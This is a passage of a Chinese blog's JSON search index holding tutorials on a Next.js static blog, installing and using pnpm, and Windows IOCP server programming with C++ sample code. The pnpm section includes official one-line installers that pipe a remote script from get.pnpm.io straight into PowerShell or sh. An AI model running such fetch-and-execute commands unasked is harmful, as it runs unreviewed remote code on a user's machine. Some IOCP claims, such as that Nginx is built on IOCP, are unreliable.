remark-html 把 ast 转成 html tailwindcss 原子化样式 class，无需头疼组件 class 的命名 ※生成页面 生成的页面对应 pages 目录下的文件，页面的路由为文件路径名，例如 pages/about.tsx ，则页面路由为 /about。 一般项目的目录都会有 src 目录，所以 next.js 也支持 src/pages 目录。 很明显，不可能为每篇 blog 文章都创建一个文件，那么就需用到动态路由（dynamic routes）。 ※getStaticPaths 动态路由形如 pages/posts/[slug].tsx，然后就会生成 posts/1, posts/2，slug 可以理解为前端路由的路径参数 params。 页面需定义 getStaticPaths 方法，必须返回 params 参数。 12345678910111213141516// pages/posts/[slug].tsxconst Post = () =&gt; &#123;...&#125;export default Postexport async function getStaticPaths() &#123; const posts = getAllPosts([&#x27;slug&#x27;]) return &#123; paths: posts.map((post) =&gt; &#123; return &#123; params: &#123; slug: post.slug, &#125;, &#125; &#125;), &#125;&#125; ※获取数据 ※getStaticProps getStaticProps 会在服务端执行，因此可以使用 node api，读取文件系统，获取 markdown 内容。 返回值会作为页面组件的 props，入参为 getStaticPaths的返回值。 12345678910111213141516171819const Post = (&#123; post, morePosts &#125;: Props) =&gt; &#123; return &lt;Layout&gt;...&lt;/Layout&gt;;&#125;;export default Post;export async function getStaticProps(&#123; params &#125;) &#123; const post = getPostBySlug(); const content = await markdownToHtml(post.content || &#x27;&#x27;); return &#123; props: &#123; post: &#123; ...post, content, &#125;, &#125;, &#125;;&#125; ※定制化 在 pages 下还有 _app.tsx 和 _document.tsx，这两个文件用于定制化页面。 next.js 默认使用 next/app 初始化页面，_app.tsx会替代next/app初始化页面，因此可以在 _app.tsx放一些公共逻辑，公共的布局，导入样式等。 12345678910111213import &#123; AppProps &#125; from &#x27;next/app&#x27;;import &#x27;github-markdown-css/github-markdown-light.css&#x27;;import &#x27;../styles/index.css&#x27;;import Layout from &#x27;@/layout&#x27;;export default function MyApp(&#123; Component, pageProps &#125;: AppProps) &#123; return ( &lt;Layout&gt; &lt;Component &#123;...pageProps&#125; /&gt; &lt;/Layout&gt; );&#125; 同样，_document.tsx 用于为 html、body 做定制化 12345678910111213import &#123; Html, Head, Main, NextScript &#125; from &#x27;next/document&#x27;;// 必须导入 Html、Head、Main、NextScript，不能省略export default function Document() &#123; return ( &lt;Html&gt; &lt;Head /&gt; &lt;body&gt; &lt;Main /&gt; &lt;NextScript /&gt; &lt;/body&gt; &lt;/Html&gt; );&#125; ※结语 一个 blog 的原型基本就搭建起来了，剩余就是部署到静态托管服务上（Vercel、GitHub Page 等），另外可以参照 example，与其他技术集成，继续美化 blog。","tags":"nextjs"},{"title":"pnpm教程","url":"/20240623/pnpm-jiao-cheng/","text":"pnpm 基本详细使用教程（安装、卸载、使用、可能遇到的问题及解决办法） ※简介 pnpm 全称 performant npm，意思为 高性能的 npm。pnpm 由 npm/yarn 衍生而来，解决了 npm/yarn 内部潜在的 bug，极大的优化了性能，扩展了使用场景。被誉为 最先进的包管理工具。 pnpm 与 npm/yarn 的区别主要有以下几点： 特点：速度快、节约磁盘空间、支持 monorepo、安全性高、创建一个非扁平的 node_modules 目录。pnpm 相比较于 yarn/npm 这两个常用的包管理工具在性能上也有了极大的提升，根据目前官方提供的 benchmark 数据可以看出在一些综合场景下比 npm/yarn 快了大概两倍。 node.js 兼容情况: 与Yarn和npm功能比较： ※安装 Prerequisites If you don’t use the standalone script or @pnpm/exe to install pnpm, then you need to have Node.js (at least v16.14) to be installed on your system. Using a standalone script You may install pnpm even if you don’t have Node.js installed, using the following scripts. ※On Windows Using PowerShell: 1iwr https://get.pnpm.io/install.ps1 -useb | iex On POSIX systems 1curl -fsSL https://get.pnpm.io/install.sh | sh - 如果没有安装 curl，可以使用 wget： 1wget -qO- https://get.pnpm.io/install.sh | sh - ※通过 npm 安装(不能通过yarn、cnpm安装) pnpm 是 pnpm 的普通版本，需要 Node.js 运行。 @pnpm/exe 与 Node.js 一起打包成可执行文件，因此它可以在没有安装 Node.js 的系统上使用。 123npm install -g pnpmornpm i -g pnpm 使用 HomeBrewbrew install pnpm 查看当前pnpm版本pnpm -v 安装完成后，配置镜像源 1234567# 获取当前配置的镜像地址pnpm get registryorpnpm config get registry# 设置新的镜像地址pnpm set registry https://registry.npmmirror.com ※使用 常用命令对比 npm 命令 pnpm 等价命令 npm install pnpm install 安装全部依赖 npm install 包名 pnpm add (-D) 包名 安装指定包 npm uninstall 包名 pnpm remove 包名 移除指定包 npm run 脚本 pnpm 脚本 运行脚本 ※升级版本 1pnpm add -g pnpm to update","tags":""},{"title":"IOCP专题","url":"/20240603/iocp-zhuan-ti/","text":"※Windows下的IOCP模型[1] [2] ※IOCP简介 IOCP（I/O Completion Port，I/O完成端口）是Windows操作系统中伸缩性最好的一种I/O模型。 I/O 完成端口是应用程序使用线程池处理异步 I/O 请求的一种机制。处理多个并发异步I/O请求时，使用 I/O 完成端口比在 I/O 请求时创建线程更快更高效。 ※IOCP的优势 I/O 完成端口可以充分利用 Windows 内核来进行 I/O 调度，相较于传统的 Winsock 模型，IOCP 在机制上有明显的优势。 模型 机制 特性 select模型 通过select函数来管理I/O，可以确定一个或多个套接字的状态 该模型的优势是程序能够在单个线程内同时处理多个套接字连接，避免了阻塞模式下的线程膨胀 WSAAsyncSelect模型 WSAAsyncSelect函数把socket设为非阻塞模式，并为socket绑定一个窗口句柄，依靠Windows的消息驱动机制，通过窗口进行消息接收、事件处理 该模型最突出的特点是与Windows的消息驱动机制融合在一起，使得开发带GUI界面的网络程序更简单 WSAEventSelect模型 该模型与WSAAsyncSelect模型类似，允许应用程序在一个或多个socket上接收基于事件的网络通知，不过该模型是经由事件对象句柄通知的 该模型简单易用，也不需要窗口环境，缺点是最多等待64个事件对象的限制，当socket连接数量增加时，必须创建多个线程来处理I/O 重叠I/O模型 该模型引入了重叠数据结构，允许应用程序使用重叠结构一次投递一个或多个异步I/O请求 该模型使用Winsock 2.0库的API，如：WSASend、WSARecv等，真正做到了“异步处理” IOCP模型 IOCP模型通过socket绑定完成端口，在socket上投递事件，工作线程在完成端口上轮询接收、处理事件 IOCP充分利用内核对象的调度，只使用少量的几个线程来处理所有网络通信，消除了无谓的线程上下文切换，最大限度地提高了网络通信的性能 相较于传统的Winsock模型，IOCP的优势主要体现在两方面：独特的异步I/O方式和优秀的线程调度机制。 ※独特的异步I/O方式 IOCP模型在异步通信方式的基础上，设计了一套能够充分利用Windows内核的I/O通信机制，主要过程为：① socket关联iocp，② 在socket上投递I/O请求，③ 事件完成返回完成通知封包，④ 工作线程在iocp上处理事件。 IOCP的这种工作模式：程序只需要把事件投递出去，事件交给操作系统完成后，工作线程在完成端口上轮询处理。该模式充分利用了异步模式高速率输入输出的优势，能够有效提高程序的工作效率。 ※优秀的线程调度机制 完成端口可以抽象为一个公共消息队列，当用户请求到达时，完成端口把这些请求加入其抽象出的公共消息队列。这一过程与多个工作线程轮询消息队列并从中取出消息加以处理是并发操作。这种方式很好地实现了异步通信和负载均衡，因为它使几个线程“公平地”处理多客户端的I/O，并且线程空闲时会被挂起，不会占用CPU周期。 IOCP模型充分利用Windows系统内核，可以实现仅用少量的几个线程来处理和多个client之间的所有通信，消除了无谓的线程上下文切换，最大限度的提高了网络通信的性能。 ※IOCP的使用 初次学习使用IOCP的朋友在熟悉各个API时，建议参看MSDN的官方文档MSDN IOCP的使用主要分为以下几步： 创建完成端口(iocp)对象 创建一个或多个工作线程，在完成端口上执行并处理投递到完成端口上的I/O请求 Socket关联iocp对象，在Socket上投递网络事件 工作线程调用GetQueuedCompletionStatus函数获取完成通知封包，取得事件信息并进行处理 ※1 创建完成端口对象 使用IOCP模型，首先要调用 CreateIoCompletionPort 函数创建一个完成端口对象，Winsock将使用这个对象为任意数量的套接字句柄管理 I/O 请求。函数定义如下： 123456HANDLE WINAPI CreateIoCompletionPort( _In_ HANDLE FileHandle, _In_opt_ HANDLE ExistingCompletionPort, _In_ ULONG_PTR CompletionKey, _In_ DWORD NumberOfConcurrentThreads); 此函数的两个不同功能： 创建一个完成端口对象 将一个或多个文件句柄（这里是套接字句柄）关联到 I/O 完成端口对象 最初创建完成端口对象时，唯一需要设置的参数是 NumberOfConcurrentThreads，该参数定义了 允许在完成端口上同时执行的线程的数量。理想情况下，我们希望每个处理器仅运行一个线程来为完成端口提供服务，以避免线程上下文切换。NumberOfConcurrentThreads 为0表示系统允许的线程数量和处理器数量一样多。因此，可以简单地使用以下代码创建完成端口对象，取得标识完成端口的句柄。 HANDLE m_hCompletion = ::CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,0); ※2 I/O工作线程和完成端口 I/O 工作线程在完成端口上执行并处理投递的I/O请求。关于工作线程的数量，要注意的是，创建完成端口时指定的线程数量和这里要创建的线程数量不是一回事。CreateIoCompletionPort 函数的 NumberOfConcurrentThreads 参数明确告诉系统允许在完成端口上同时运行的线程数量。如果创建的线程数量多于 NumberOfConcurrentThreads，也仅有NumberOfConcurrentThreads 个线程允许运行。 但也存在确实需要创建更多线程的特殊情况，这主要取决于程序的总体设计。如果某个线程调用了一个函数，如 Sleep 或 WaitForSingleObject，进入了暂停状态，多出来的线程中就会有一个开始运行，占据休眠线程的位置。 有了足够的工作线程来处理完成端口上的 I/O 请求后，就该为完成端口关联套接字句柄了，这就用到了 CreateCompletionPort 函数的前3个参数。 FileHandle：要关联的套接字句柄 ExistingCompletionPort：要关联的完成端口对象句柄 CompletionKey：指定一个句柄唯一(per-handle)数据，它将与FileHandle套接字句柄关联在一起 ※3 完成端口和重叠I/O 向完成端口关联套接字句柄之后，便可以通过在套接字上投递重叠发送和接收请求处理 I/O。在这些 I/O 操作完成时，I/O 系统会向完成端口对象发送一个完成通知封包。I/O 完成端口以先进先出的方式为这些封包排队。工作线程调用 GetQueuedCompletionStatus 函数可以取得这些队列中的封包。函数定义如下： 1234567BOOL GetQueuedCompletionStatus( [in] HANDLE CompletionPort, LPDWORD lpNumberOfBytesTransferred, [out] PULONG_PTR lpCompletionKey, [out] LPOVERLAPPED *lpOverlapped, [in] DWORD dwMilliseconds); 参数说明 CompletionPort：完成端口对象句柄 lpNumberOfBytesTransferred：I/O操作期间传输的字节数 lpCompletionKey：关联套接字时指定的句柄唯一数据 lpOverlapped：投递 I/O 请求时使用的重叠对象地址，进一步得到 I/O 唯一(per-I/O)数据 lpCompletionKey 参数包含了我们称为 per-handle 的数据，该数据在套接字第一次关联到完成端口时传入，用于标识 I/O 事件是在哪个套接字句柄上发生的。可以给这个参数传递任何类型的数据。 lpOverlapped 参数指向一个 OVERLAPPED 结构，结构后面便是我们称为per-I/O的数据，这可以是工作线程处理完成封包时想要知道的任何信息。 per-handle数据和per-I/O数据结构类型示例 1234567891011121314151617#define BUFFER_SIZE 1024//per-handle 数据typedef struct _PER_HANDLE_DATA&#123; SOCKET s; //对应的套接字句柄 SOCKADDR_IN addr; //客户端地址信息&#125;PER_HANDLE_DATA,*PPER_HANDLE_DATA;//per-I/O 数据typedef struct _PER_IO_DATA&#123; OVERLAPPED ol; //重叠结构 char buf[BUFFER_SIZE]; //数据缓冲区 int nOperationType; //I/O操作类型#define OP_READ 1#define OP_WRITE 2#define OP_ACCEPT 3&#125;PER_IO_DATA,*PPER_IO_DATA; ※4 示例程序 主线程首先创建完成端口对象，创建工作线程处理完成端口对象中的事件；然后创建监听套接字，开始监听服务端口；循环处理到来的连接请求，该过程具体如下： 调用 accept 函数等待接受未决的连接请求 接受新连接后，创建 per-handle 数，并将其关联到完成端口对象 在新接受的套接字上投递一个接收请求，该I/O完成后，由工作线程负责处理 123456789101112131415161718192021222324252627282930313233343536void main()&#123; int nPort = 4567; HANDLE hCompletion = ::CreateIoCompletionPort(INVALID_HANDLE_VALUE, 0, 0, 0); //创建完成端口对象 ::CreateThread(NULL, 0, ServerThread, (LPVOID)hCompletion, 0, 0); //创建工作线程 //创建监听套接字，绑定到本地地址，开始监听 SOCKET sListen = ::socket(AF_INET, SOCK_STREAM, 0); SOCKADDR_IN si; si.sin_family = AF_INET; si.sin_port = ::ntohs(nPort); si.sin_addr.S_un.S_addr = INADDR_ANY; ::bind(sListen, (sockaddr*)&amp;si, sizeof(si)); ::listen(sListen, 5); //循环处理到来的连接 while (true) &#123; //等待接受未决的连接请求 SOCKADDR_IN saRemote; int nRemoteLen = sizeof(saRemote); SOCKET sNew = ::accept(sListen, (sockaddr*)&amp;saRemote, &amp;nRemoteLen); //接受到新连接之后，为它创建一个per-handle数据，并将它们关联到完成端口对象 PPER_HANDLE_DATA pPerHandle = (PPER_HANDLE_DATA)::GlobalAlloc(GPTR, sizeof(PER_HANDLE_DATA)); pPerHandle-&gt;s = sNew; memcpy(&amp;pPerHandle-&gt;addr, &amp;saRemote, nRemoteLen); ::CreateIoCompletionPort((HANDLE)pPerHandle-&gt;s, hCompletion, (DWORD)pPerHandle, 0); //投递一个接收请求 PPER_IO_DATA pPerIO = (PPER_IO_DATA)::GlobalAlloc(GPTR, sizeof(PER_IO_DATA)); pPerIO-&gt;nOperationType = OP_READ; WSABUF buf; buf.buf = pPerIO-&gt;buf; buf.len = BUFFER_SIZE; DWORD dwRecv; DWORD dwFlags = 0; ::WSARecv(pPerHandle-&gt;s, &amp;buf, 1, &amp;dwRecv, &amp;dwFlags, &amp;pPerIO-&gt;ol, NULL); &#125;&#125; I/O 工作线程循环调用 GetQueuedCompletionStatus 函数从 I/O 完成端口移除完成的 I/O 通知封包，解析并进行处理。 1234567891011121314151617181920212223242526272829303132333435363738394041424344DWORD WINAPI ServerThread(LPVOID lpParam)&#123; //得到完成端口对象句柄 HANDLE hCompletion = (HANDLE)lpParam; DWORD dwTrans; PPER_HANDLE_DATA pPerHandle; PPER_IO_DATA pPerIO; while (true) &#123; //在关联到此完成端口的所有套接字上等待I/O完成 BOOL bOK = ::GetQueuedCompletionStatus(hCompletion, &amp;dwTrans, (PULONG_PTR)&amp;pPerHandle, (LPOVERLAPPED*)&amp;pPerIO, WSA_INFINITE); if (!bOK) &#123; //在此套接字上由错误发生 ::closesocket(pPerHandle-&gt;s); ::GlobalFree(pPerHandle); ::GlobalFree(pPerIO); continue; &#125; if (dwTrans == 0 &amp;&amp; (pPerIO-&gt;nOperationType == OP_READ || pPerIO-&gt;nOperationType == OP_WRITE)) &#123; ::closesocket(pPerHandle-&gt;s); ::GlobalFree(pPerHandle); ::GlobalFree(pPerIO); continue; &#125; switch (pPerIO-&gt;nOperationType) &#123; //通过per-IO数据中的nOperationType域查看有什么I/O请求完成了 case OP_READ: //完成一个接收请求 &#123; pPerIO-&gt;buf[dwTrans] = &#x27;\\0&#x27;; cout &lt;&lt; &quot;接收到数据：&quot; &lt;&lt; pPerIO-&gt;buf &lt;&lt; endl; cout &lt;&lt; &quot;共有&quot; &lt;&lt; dwTrans &lt;&lt; &quot;字符&quot; &lt;&lt; endl; //继续投递接收I/O请求 WSABUF buf; buf.buf = pPerIO-&gt;buf; buf.len = BUFFER_SIZE; pPerIO-&gt;nOperationType = OP_READ; DWORD nFlags = 0; ::WSARecv(pPerHandle-&gt;s, &amp;buf, 1, &amp;dwTrans, &amp;nFlags, &amp;pPerIO-&gt;ol, NULL); &#125; break; case OP_WRITE: //本例中没有投递这些类型的I/O请求 case OP_ACCEPT: break; &#125; &#125; return 0;&#125; ※5 恰当地关闭IOCP 关闭 I/O 完成端口时，特别是有多个线程在socket上执行 I/O 时，要避免当重叠操作正在进行时释放它的 OVERLAPPED 结构。阻止该情况发生的最好方法是在每个 socket 上调用 closesocket 函数，确保所有未决的重叠 I/O 操作都会完成。 一旦所有socket关闭，就该终止完成端口上处理 I/O 事件的工作线程了。可以通过调用 PostQueuedCompletionStatus 函数发送特定的完成封包来实现。所有工作线程都终止之后，可以调用 CloseHandle 函数关闭完成端口。 ※Windows之IOCP[3] IOCP全称I/O Completion Port，中文译为I/O完成端口。IOCP是一个异步I/O的Windows API，它可以高效地将I/O事件通知给应用程序，类似于Linux中的Epoll，关于epoll可以参考linux之epoll ※简介 IOCP模型属于一种通讯模型，适用于Windows平台下高负载服务器的一个技术。在处理大量用户并发请求时，如果采用一个用户一个线程的方式那将造成CPU在这成千上万的线程间进行切换，后果是不可想象的。而IOCP完成端口模型则完全不会如此处理，它的理论是并行的线程数量必须有一个上限-也就是说同时发出500个客户请求，不应该允许出现500个可运行的线程。目前来说，IOCP完成端口是Windows下性能最好的I/O模型，同时它也是最复杂的内核对象。它避免了大量用户并发时原有模型采用的方式，极大的提高了程序的并行处理能力。 ※原理图 一共包括三部分：完成端口（存放重叠的I/O请求），客户端请求的处理，等待者线程队列（一定数量的工作者线程，一般采用CPU*2个） 完成端口中所谓的[端口]并不是我们在TCP/IP中所提到的端口，可以说是完全没有关系。它其实就是一个通知队列，由操作系统把已经完成的重叠I/O请求的通知放入其中。当某项I/O操作一旦完成，某个可以对该操作结果进行处理的工作者线程就会收到一则通知。 通常情况下，我们会在创建一定数量的工作者线程来处理这些通知，也就是线程池的方法。线程数量取决于应用程序的特定需要。理想的情况是，线程数量等于处理器的数量，不过这也要求任何线程都不应该执行诸如同步读写、等待事件通知等阻塞型的操作，以免线程阻塞。每个线程都将分到一定的CPU时间，在此期间该线程可以运行，然后另一个线程将分到一个时间片并开始执行。如果某个线程执行了阻塞型的操作，操作系统将剥夺其未使用的剩余时间片并让其它线程开始执行。也就是说，前一个线程没有充分使用其时间片，当发生这样的情况时，应用程序应该准备其它线程来充分利用这些时间片。 ※IOCP优点 基于IOCP的开发是异步IO的，决定了IOCP所实现的服务器的高吞吐量。 通过引入IOCP，会大大减少Thread切换带来的额外开销，最小化的线程上下文切换，减少线程切换带来的巨大开销，让CPU把大量的事件用于线程的运行。当与该完成端口相关联的可运行线程的总数目达到了该并发量，系统就会阻塞， ※IOCP应用 ※创建和关联完成端口 12345678910//功能：创建完成端口和关联完成端口 HANDLE WINAPI CreateIoCompletionPort( * __in HANDLE FileHandle, // 已经打开的文件句柄或者空句柄，一般是客户端的句柄 * __in HANDLE ExistingCompletionPort, // 已经存在的IOCP句柄 * __in ULONG_PTR CompletionKey, // 完成键，包含了指定I/O完成包的指定文件 * __in DWORD NumberOfConcurrentThreads // 真正并发同时执行最大线程数，一般推介是CPU核心数*2 * );//创建完成端口句柄HANDLE completionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, 0)； ※与socket进行关联 12345678typedef struct&#123; SOCKET socket;//客户端socket SOCKADDR_STORAGE ClientAddr;//客户端地址&#125;PER_HANDLE_DATA, *LPPER_HANDLE_DATA;//与socket进行关联CreateIoCompletionPort((HANDLE)(PerHandleData -&gt; socket), completionPort, (DWORD)PerHandleData, 0); ※获取队列完成状态 123456789101112//功能：获取队列完成状态/*返回值：调用成功，则返回非零数值，相关数据存于lpNumberOfBytes、lpCompletionKey、lpoverlapped变量中。失败则返回零值。*/BOOL GetQueuedCompletionStatus( HANDLE CompletionPort, //完成端口句柄 LPDWORD lpNumberOfBytes, //一次I/O操作所传送的字节数 PULONG_PTR lpCompletionKey, //当文件I/O操作完成后，用于存放与之关联的CK LPOVERLAPPED *lpOverlapped, //IOCP特定的结构体 DWORD dwMilliseconds); //调用者的等待时间/* ※用于IOCP的特点函数 1234567//用于IOCP的特定函数typedef struct _OVERLAPPEDPLUS&#123; OVERLAPPED ol; //一个固定的用于处理网络消息事件返回值的结构体变量 SOCKET s, sclient; int OpCode; //用来区分本次消息的操作类型（在完成端口的操作里面，是以消息通知系统，读数据/写数据，都是要发这样的消息结构体过去的） WSABUF wbuf; //读写缓冲区结构体变量 DWORD dwBytes, dwFlags; //一些在读写时用到的标志性变量 &#125;OVERLAPPEDPLUS; ※投递一个队列完成状态 123456//功能：投递一个队列完成状态BOOL PostQueuedCompletionStatus( HANDLE CompletlonPort, //指定想向其发送一个完成数据包的完成端口对象 DW0RD dwNumberOfBytesTrlansferred, //指定—个值,直接传递给GetQueuedCompletionStatus 函数中对应的参数 DWORD dwCompletlonKey, //指定—个值,直接传递给GetQueuedCompletionStatus函数中对应的参数 LPOVERLAPPED lpoverlapped, ); //指定—个值,直接传递给GetQueuedCompletionStatus 函数中对应的参数 ※示例 ※Server.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159#include &lt;winsock2.h&gt;#include &lt;windows.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;#pragma comment(lib,&quot;ws2_32.lib&quot;)#pragma comment(lib,&quot;kernel32.lib&quot;)HANDLE g_hIOCP;enum IO_OPERATION&#123;IO_READ,IO_WRITE&#125;;struct IO_DATA&#123; OVERLAPPED Overlapped; WSABUF wsabuf; int nBytes; IO_OPERATION opCode; SOCKET client;&#125;;char buffer[1024];DWORD WINAPI WorkerThread (LPVOID WorkThreadContext) &#123; IO_DATA *lpIOContext = NULL; DWORD nBytes = 0; DWORD dwFlags = 0; int nRet = 0; DWORD dwIoSize = 0; void * lpCompletionKey = NULL; LPOVERLAPPED lpOverlapped = NULL; while(1)&#123; GetQueuedCompletionStatus(g_hIOCP, &amp;dwIoSize,(LPDWORD)&amp;lpCompletionKey,(LPOVERLAPPED *)&amp;lpOverlapped, INFINITE); lpIOContext = (IO_DATA *)lpOverlapped; if(dwIoSize == 0) &#123; cout &lt;&lt; &quot;Client disconnect&quot; &lt;&lt; endl; closesocket(lpIOContext-&gt;client); delete lpIOContext; continue; &#125; if(lpIOContext-&gt;opCode == IO_READ) // a read operation complete &#123; ZeroMemory(&amp;lpIOContext-&gt;Overlapped, sizeof(lpIOContext-&gt;Overlapped)); lpIOContext-&gt;wsabuf.buf = buffer; lpIOContext-&gt;wsabuf.len = strlen(buffer)+1; lpIOContext-&gt;opCode = IO_WRITE; lpIOContext-&gt;nBytes = strlen(buffer)+1; dwFlags = 0; nBytes = strlen(buffer)+1; nRet = WSASend( lpIOContext-&gt;client, &amp;lpIOContext-&gt;wsabuf, 1, &amp;nBytes, dwFlags, &amp;(lpIOContext-&gt;Overlapped), NULL); if( nRet == SOCKET_ERROR &amp;&amp; (ERROR_IO_PENDING != WSAGetLastError()) ) &#123; cout &lt;&lt; &quot;WASSend Failed::Reason Code::&quot;&lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(lpIOContext-&gt;client); delete lpIOContext; continue; &#125; memset(buffer, NULL, sizeof(buffer)); &#125; else if(lpIOContext-&gt;opCode == IO_WRITE) //a write operation complete &#123; // Write operation completed, so post Read operation. lpIOContext-&gt;opCode = IO_READ; nBytes = 1024; dwFlags = 0; lpIOContext-&gt;wsabuf.buf = buffer; lpIOContext-&gt;wsabuf.len = nBytes; lpIOContext-&gt;nBytes = nBytes; ZeroMemory(&amp;lpIOContext-&gt;Overlapped, sizeof(lpIOContext-&gt;Overlapped)); nRet = WSARecv( lpIOContext-&gt;client, &amp;lpIOContext-&gt;wsabuf, 1, &amp;nBytes, &amp;dwFlags, &amp;lpIOContext-&gt;Overlapped, NULL); if( nRet == SOCKET_ERROR &amp;&amp; (ERROR_IO_PENDING != WSAGetLastError()) ) &#123; cout &lt;&lt; &quot;WASRecv Failed::Reason Code1::&quot;&lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(lpIOContext-&gt;client); delete lpIOContext; continue; &#125; cout&lt;&lt;lpIOContext-&gt;wsabuf.buf&lt;&lt;endl; &#125; &#125; return 0;&#125;void main ()&#123; WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &amp;wsaData); SOCKET m_socket = WSASocket(AF_INET,SOCK_STREAM, IPPROTO_TCP, NULL,0,WSA_FLAG_OVERLAPPED); sockaddr_in server; server.sin_family = AF_INET; server.sin_port = htons(6000); server.sin_addr.S_un.S_addr = htonl(INADDR_ANY); bind(m_socket ,(sockaddr*)&amp;server,sizeof(server)); listen(m_socket, 8); SYSTEM_INFO sysInfo; GetSystemInfo(&amp;sysInfo); int g_ThreadCount = sysInfo.dwNumberOfProcessors * 2; g_hIOCP = CreateIoCompletionPort(INVALID_HANDLE_VALUE,NULL,0,g_ThreadCount); //CreateIoCompletionPort((HANDLE)m_socket,g_hIOCP,0,0); for( int i=0;i &lt; g_ThreadCount; ++i)&#123; HANDLE hThread; DWORD dwThreadId; hThread = CreateThread(NULL, 0, WorkerThread, 0, 0, &amp;dwThreadId); CloseHandle(hThread); &#125; while(1) &#123; SOCKET client = accept( m_socket, NULL, NULL ); cout &lt;&lt; &quot;Client connected.&quot; &lt;&lt; endl; if (CreateIoCompletionPort((HANDLE)client, g_hIOCP, 0, 0) == NULL)&#123; cout &lt;&lt; &quot;Binding Client Socket to IO Completion Port Failed::Reason Code::&quot;&lt;&lt; GetLastError() &lt;&lt; endl; closesocket(client); &#125; else &#123; //post a recv request IO_DATA * data = new IO_DATA; memset(buffer, NULL ,1024); memset(&amp;data-&gt;Overlapped, 0 , sizeof(data-&gt;Overlapped)); data-&gt;opCode = IO_READ; data-&gt;nBytes = 0; data-&gt;wsabuf.buf = buffer; data-&gt;wsabuf.len = sizeof(buffer); data-&gt;client = client; DWORD nBytes= 1024 ,dwFlags=0; int nRet = WSARecv(client,&amp;data-&gt;wsabuf, 1, &amp;nBytes, &amp;dwFlags, &amp;data-&gt;Overlapped, NULL); if(nRet == SOCKET_ERROR &amp;&amp; (ERROR_IO_PENDING != WSAGetLastError()))&#123; cout &lt;&lt; &quot;WASRecv Failed::Reason Code::&quot;&lt;&lt; WSAGetLastError() &lt;&lt; endl; closesocket(client); delete data; &#125; cout&lt;&lt;data-&gt;wsabuf.buf&lt;&lt;endl; &#125; &#125; closesocket(m_socket); WSACleanup();&#125; ※client.cpp 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include &lt;WinSock2.h&gt;using namespace std;#pragma comment(lib,&quot;ws2_32.lib&quot;)void main()&#123; WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &amp;wsaData); sockaddr_in server; server.sin_family = AF_INET; server.sin_port = htons(6000); server.sin_addr.S_un.S_addr = inet_addr(&quot;127.0.0.1&quot;); SOCKET client = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); int flag; flag = connect(client, (sockaddr*)&amp;server, sizeof(server)); if(flag &lt; 0)&#123; cout&lt;&lt;&quot;error!&quot;&lt;&lt;endl; return; &#125; while(1)&#123; cout&lt;&lt;&quot;sent hello!!!!&quot;&lt;&lt;endl; char buffer[1024]; strcpy(buffer,&quot;hello&quot;); send(client, buffer, 1024, 0); memset(buffer, NULL, sizeof(buffer)); cout&lt;&lt;&quot;recv: &quot;&lt;&lt;endl; int rev = recv(client, buffer, 1024, 0); if(rev == 0) cout&lt;&lt;&quot;recv nothing!&quot;&lt;&lt;endl; cout&lt;&lt;buffer&lt;&lt;endl; Sleep(10000); &#125; closesocket(client); WSACleanup();&#125; ※C++ | IOCP 完成端口，最高性能的网络编程模型原理[4] ※0. 前言 在C++的网络编程中，存在诸多模型，如基础 Socket 模型，同步非阻塞的 select 模型，以及本文要详细说明的 IOCP 模型等。 而随着业务的深入开发，应用场景的不断拓展，一般的 Socket 模型由于其采用阻塞模式，会有很严重的性能问题，只会在我们初学网络编程的时候进行简单的使用，如开发一对一或者一对少量客户景。 而 select 模型，则采用了同步非阻塞 I/O 机制，通过 select 函数来轮询处理客户端发送过来的 Socket，很好的解决了 Socket 模型中的性能问题。在 Linux 和 Windows 平台，该模型都有比较广泛的应用场景，比如常见的 libevent 库底层就是使用的 select 模型。 至于 IOCP 模型，则来源于微软为 Windows 开的“后门”，采用特有的并发异步非阻塞通信机制，与 Linux 中的 Epoll 并称为两大高效模型，在高并发、高压环境的服务器需求下，非常推荐使用 IOCP 来应对。比如大名鼎鼎的 Nginx 服务器，底层就是使用的 IOCP 模型实现。 在这篇文章中，您将逐步认识到 IOCP 性能强劲的秘密。 ※1. 什么是 IOCP？ IOCP：I/O completion ports（完成端口），一种用于处理多处理器系统中，多个异步 I/O 请求的线程模型。当进程创建 I/O 完成端口时，系统会为对应请求提供服务的线程创建关联的对象队列。利用 Windows 内核对象来对 I/O 进行调度。属于 C/S 通信模型中，性能最优秀的网络通信模型。 ※2. IOCP 为什么快？ 在弄清楚这个问题之前，我们需要了解 IOCP 实现的基本原理，通过实现过程，我们便可以一步步探知 IOCP 快的原因： 系统根据 CPU 核心的数量来创建线程； 系统使线程保持等待，当存在客户端请求时，将客户端请求加入到公共消息队列中； 系统创建的线程逐一排队，从消息队列中取出消息并对其进行处理； 当线程完成消息，且后续没有消息需要完成时，CPU 才会将线程挂起，不占用 CPU 的使用周期。 通俗点讲，IOCP 的实现很类似于我们坐高铁进站过安检，人群是一个个的消息，而安检机则是一个个工作线程，我们排队经过身份识别后，选择合适的位置进行安检。 ![IOCP 的基本运行原理图](598c408facb5460ba85b38af57dcda94~tplv-k3u1fbpfcp-zoom-in-crop-mark 1512 0 0 0.webp) 在 IOCP 的基本运行原理中，我们会发现，CPU 基本上都是处在工作状态的，由于我们根据 CPU 的核心数创建工作线程，因此每个线程需要执行时，都能保证有可用的 CPU 资源进行调度，而同样，也能保证在执行过程中，尽可能少的发生线程的上下文切换，这是 IOCP 快的第一层“秘诀”。 在 IOCP 调度的过程中，我们不能忽略的问题是，即使我们为每个 CPU 分配了工作线程，那谁来给工作线程派“任务”呢？ 此时我们便可以把目光放到那条公共消息队列中，在 IOCP 中，所有的工作线程会轮询这条公共消息队列，并从中取出消息加以处理。在这个过程中，队列与多个工作线程非常优雅地实现了异步通信与负载均衡，在线程空闲时，IOCP 也会及时将线程挂起，防止 CPU 周期的占用。 而第二条“秘诀”，便是这条公共消息队列，因此完成端口其实本质上与我们常说的端口并没有什么关系，感觉叫完成队列更合适。 至于最后一层“秘诀”，则需要回到我们的基本网络通信机制中去。 